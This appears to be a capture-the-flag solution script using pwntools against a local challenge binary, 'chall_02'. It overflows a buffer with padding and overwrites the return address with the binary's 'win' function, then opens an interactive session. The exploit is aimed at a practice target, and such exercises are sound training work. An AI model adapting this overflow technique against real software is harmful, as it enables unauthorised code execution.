from pwn import *
binary=ELF("./chall_02")
p=process("./chall_02")
p.sendline()
p.sendline((0x3a+0x4)*b"A"+p32(binary.sym.win))
p.interactive()
